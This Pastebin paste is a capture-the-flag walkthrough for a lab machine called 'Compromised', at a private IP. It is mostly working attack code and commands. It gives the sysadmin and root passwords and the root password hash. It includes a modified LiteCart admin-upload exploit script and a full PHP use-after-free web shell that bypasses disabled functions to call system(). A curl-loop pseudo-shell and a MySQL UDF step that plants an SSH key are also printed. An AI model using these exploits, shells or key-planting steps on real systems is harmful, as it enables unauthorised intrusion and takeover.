# Compromised - Pastebin.com

Pastebin.com is the number one paste tool since 2002. Pastebin is a website where you can store text online for a set period of time.

 At first very simple method:
  
 ssh sysadmin@10.10.10.207 with password = 3\*NLJE32I$Fe
  
 su root with password = zlke~U3Env82m2-
  
 \*\*\*\*\*\*\*\* ROOT HASH TO DECRYPT WRITEUPS: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
  
 root:$6$lAY5.6eu$m26Pk/KZfbG/KIxgQwSM2W.PuARZt9Qrs2HLNylIuLVIlKe0nyoa2tDk3Kb98JFJDzxfSU0oOoBdGrFhMzOgU0:18394:0:99999:7:::
  
 \===========================================================================================================================
  
 NMAP RESULT:
  
 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  
 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
  
 \=======================================================
  
 DIRECTORY SEARCHING RESULT:
	  
	 /.hta (Status: 403)
	  
	 /.htaccess (Status: 403)
	  
	 /.htpasswd (Status: 403)
	  
	 /.ssh (Status: 301)
	  
	 /backup (Status: 301) <-it's interesting
	  
	 /index.php (Status: 302)
	  
	 /server-status (Status: 403)
	  
	 /shop (Status: 301)
	  
 ++++++++++++++++++++++++++++++++++++++
  
 In browser: http://10.10.10.207/backup and download file a.tar.gz
  

	 tar -xvf a.tar.gz
	  
	 find . -printf "%T@ %Tc %p\\n" | sort -n <-to look last modify files
	  
	 In file "./admin/login.php" there is string:
	  
	 //file\_put\_contents("./.log2301c9430d8593ae.txt", "User: " . $\_POST\['username'\] . " Passwd: " . $\_POST\['password'\]);
	  

 Then:
	  
	 http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
	  
 find creds User: admin Passwd: theNextGenSt0r3!~
	  
 This creds on page:
	  
 http://10.10.10.207/shop/admin/
  

 >Version - "LiteCart 2.1.2"
  
 `Exploit for it: https://www.exploit-db.com/exploits/45267`
  

 +++++++ ACTIONS: ++++++++++++
  
 In one directory:
  
 \-create file mybypass.php (content below)
  
 \-modify exploit 45267.py (content below)
  
 Then:
  
 python 45267.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin
  
 And possible in browser:
  
 http://10.10.10.207/shop/vqmod/xml/mybypass.php?c=id
  
 result:
  
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
 ++++++++++++++++++++++++++++++++++++++
  
 \- create file pshell.sh (content below) and chmod +x pshell.sh
  
 start it: ./pshell.sh and get pseudoshell
  
 Command:
  
	mysql -u root -pchangethis -e "select exec\_cmd('echo YOUR\_id\_rsa.pub > /var/lib/mysql/.ssh/authorized\_keys')"
  

 And connect:
  
	ssh -i /your path/.ssh/id\_rsa mysql@10.10.10.207

	mysql@compromised:~$ grep -nlri sysadmin
  
 result: strace-log.dat
  
 There is password for user sysadmin inside, and further:
  
	mysql@compromised:~$ su sysadmin
  
 with password 3\*NLJE32I$Fe
  
 Inside /home/sysadmin get user.txt
  

 \========== POSSIBLE: =============================
  
	ssh sysadmin@10.10.10.207 with password 3\*NLJE32I$Fe
  

 Search modified files from July,14 till today:
  
	find / -newermt "2020-07-14" ! -newermt "2020-09-25" -type f 2>/dev/null
  
 This files:
  
	/lib/x86\_64-linux-gnu/security/.pam\_unix.so
  
	/lib/x86\_64-linux-gnu/security/pam\_unix.so
  

 You can use reversing for file pam\_unix.so
  
 or command on victim:
  
	objdump -D /lib/x86\_64-linux-gnu/security/pam\_unix.so | less
  
 \===================================================
  
 Then need to convert and get root password: zlke~U3Env82m2-
  
 To get root: su root { Via ssh root@... not work!}
  
 with password zlke~U3Env82m2-
  
 \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
  
 \=========== Content of modified file 45267.py ==========================
  
	#!/usr/bin/env python

	import mechanize

	import cookielib

	import urllib2

	import requests

	import sys

	import argparse

	import random

	import string

	parser = argparse.ArgumentParser(description='LiteCart')

	parser.add\_argument('-t',

	help='admin login page url - EX: https://IPADDRESS/admin/')

	parser.add\_argument('-p',

	help='admin password')

	parser.add\_argument('-u',

	help='admin username')

	args = parser.parse\_args()

	if(not args.u or not args.t or not args.p):

	sys.exit("-h for help")

	url = args.t

	user = args.u

	password = args.p


	br = mechanize.Browser()

	cookiejar = cookielib.LWPCookieJar()

	br.set\_cookiejar( cookiejar )

	br.set\_handle\_equiv( True )

	br.set\_handle\_redirect( True )

	br.set\_handle\_referer( True )

	br.set\_handle\_robots( False )

	br.addheaders = \[ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) \]

	response = br.open(url)

	br.select\_form(name="login\_form")

	br\["username"\] = user

	br\["password"\] = password

	res = br.submit()

	response = br.open(url + "?app=vqmods&doc=vqmods")

	one=""

	for form in br.forms():

	one= str(form).split("(")

	one= one\[1\].split("=")

	one= one\[1\].split(")")

	one = one\[0\]

	cookies = br.\_ua\_handlers\['\_cookies'\].cookiejar

	cookie\_dict = {}

	for c in cookies:

	cookie\_dict\[c.name\] = c.value

	bypass = open('bypass.php', 'r').read()


	files = {

	'vqmod': ("mybypass.php", bypass, "application/xml"),

	'token':one,

	'upload':(None,"Upload")

	}

	response = requests.post(url + "?app=vqmods&doc=vqmods", files=files, cookies=cookie\_dict)

	r = requests.get(url + "../vqmod/xml/mybypass.php?c=id")

	if r.status\_code == 200:

	print "Shell => " + url + "../vqmod/xml/mybypass.php"

	else:

	print "Sorry something went wrong"

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


 \============= Content of file mybypass.php =============================
  
	<?php


	pwn($\_REQUEST\['c'\]);


	function pwn($cmd) {

	global $abc, $helper;


	function str2ptr(&$str, $p = 0, $s = 8) {

	$address = 0;

	for($j = $s-1; $j >= 0; $j--) {

	$address <<= 8;

	$address |= ord($str\[$p+$j\]);

	}

	return $address;

	}


	function ptr2str($ptr, $m = 8) {

	$out = "";

	for ($i=0; $i < $m; $i++) {

	$out .= chr($ptr & 0xff);

	$ptr >>= 8;

	}

	return $out;

	}


	function write(&$str, $p, $v, $n = 8) {

	$i = 0;

	for($i = 0; $i < $n; $i++) {

	$str\[$p + $i\] = chr($v & 0xff);

	$v >>= 8;

	}

	}


	function leak($addr, $p = 0, $s = 8) {

	global $abc, $helper;

	write($abc, 0x68, $addr + $p - 0x10);

	$leak = strlen($helper->a);

	if($s != 8) { $leak %= 2 << ($s \* 8) - 1; }

	return $leak;

	}


	function parse\_elf($base) {

	$e\_type = leak($base, 0x10, 2);


	$e\_phoff = leak($base, 0x20);

	$e\_phentsize = leak($base, 0x36, 2);

	$e\_phnum = leak($base, 0x38, 2);


	for($i = 0; $i < $e\_phnum; $i++) {

	$header = $base + $e\_phoff + $i \* $e\_phentsize;

	$p\_type = leak($header, 0, 4);

	$p\_flags = leak($header, 4, 4);

	$p\_vaddr = leak($header, 0x10);

	$p\_memsz = leak($header, 0x28);


	if($p\_type == 1 && $p\_flags == 6) { # PT\_LOAD, PF\_Read\_Write

	\# handle pie

	$data\_addr = $e\_type == 2 ? $p\_vaddr : $base + $p\_vaddr;

	$data\_size = $p\_memsz;

	} else if($p\_type == 1 && $p\_flags == 5) { # PT\_LOAD, PF\_Read\_exec

	$text\_size = $p\_memsz;

	}

	}


	if(!$data\_addr || !$text\_size || !$data\_size)

	return false;


	return \[$data\_addr, $text\_size, $data\_size\];

	}


	function get\_basic\_funcs($base, $elf) {

	list($data\_addr, $text\_size, $data\_size) = $elf;

	for($i = 0; $i < $data\_size / 8; $i++) {

	$leak = leak($data\_addr, $i \* 8);

	if($leak - $base > 0 && $leak - $base < $text\_size) {

	$deref = leak($leak);

	\# 'constant' constant check

	if($deref != 0x746e6174736e6f63)

	continue;

	} else continue;


	$leak = leak($data\_addr, ($i + 4) \* 8);

	if($leak - $base > 0 && $leak - $base < $text\_size) {

	$deref = leak($leak);

	\# 'bin2hex' constant check

	if($deref != 0x786568326e6962)

	continue;

	} else continue;


	return $data\_addr + $i \* 8;

	}

	}


	function get\_binary\_base($binary\_leak) {

	$base = 0;

	$start = $binary\_leak & 0xfffffffffffff000;

	for($i = 0; $i < 0x1000; $i++) {

	$addr = $start - 0x1000 \* $i;

	$leak = leak($addr, 0, 7);

	if($leak == 0x10102464c457f) { # ELF header

	return $addr;

	}

	}

	}


	function get\_system($basic\_funcs) {

	$addr = $basic\_funcs;

	do {

	$f\_entry = leak($addr);

	$f\_name = leak($f\_entry, 0, 6);


	if($f\_name == 0x6d6574737973) { # system

	return leak($addr + 8);

	}

	$addr += 0x20;

	} while($f\_entry != 0);

	return false;

	}


	class ryat {

	var $ryat;

	var $chtg;


	function \_\_destruct()

	{

	$this->chtg = $this->ryat;

	$this->ryat = 1;

	}

	}


	class Helper {

	public $a, $b, $c, $d;

	}


	if(stristr(PHP\_OS, 'WIN')) {

	die('This PoC is for \*nix systems only.');

	}


	$n\_alloc = 10; # increase this value if you get segfaults


	$contiguous = \[\];

	for($i = 0; $i < $n\_alloc; $i++)

	$contiguous\[\] = str\_repeat('A', 79);


	$poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';

	$out = unserialize($poc);

	gc\_collect\_cycles();


	$v = \[\];

	$v\[0\] = ptr2str(0, 79);

	unset($v);

	$abc = $out\[2\]\[0\];


	$helper = new Helper;

	$helper->b = function ($x) { };


	if(strlen($abc) == 79) {

	die("UAF failed");

	}


	\# leaks

	$closure\_handlers = str2ptr($abc, 0);

	$php\_heap = str2ptr($abc, 0x58);

	$abc\_addr = $php\_heap - 0xc8;


	\# fake value

	write($abc, 0x60, 2);

	write($abc, 0x70, 6);


	\# fake reference

	write($abc, 0x10, $abc\_addr + 0x60);

	write($abc, 0x18, 0xa);


	$closure\_obj = str2ptr($abc, 0x20);


	$binary\_leak = leak($closure\_handlers, 8);

	if(!($base = get\_binary\_base($binary\_leak))) {

	die("Couldn't determine binary base address");

	}


	if(!($elf = parse\_elf($base))) {

	die("Couldn't parse ELF header");

	}


	if(!($basic\_funcs = get\_basic\_funcs($base, $elf))) {

	die("Couldn't get basic\_functions address");

	}


	if(!($zif\_system = get\_system($basic\_funcs))) {

	die("Couldn't get zif\_system address");

	}


	\# fake closure object

	$fake\_obj\_offset = 0xd0;

	for($i = 0; $i < 0x110; $i += 8) {

	write($abc, $fake\_obj\_offset + $i, leak($closure\_obj, $i));

	}


	\# pwn

	write($abc, 0x20, $abc\_addr + $fake\_obj\_offset);

	write($abc, 0xd0 + 0x38, 1, 4); # internal func type

	write($abc, 0xd0 + 0x68, $zif\_system); # internal func handler


	($helper->b)($cmd);


	exit();

	}

 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  
 \========== Content of file pshell.sh ========================
  
	#!/bin/bash


	echo "x for exit"

	input=""

	while \[ "$input" != "x" \]

	do

	echo -n "> "

	read input

	curl -XPOST http://10.10.10.207/shop/vqmod/xml/mybypass.php --data-urlencode "c=$input"

	done


[Source](https://pastebin.com/QMwtg181)
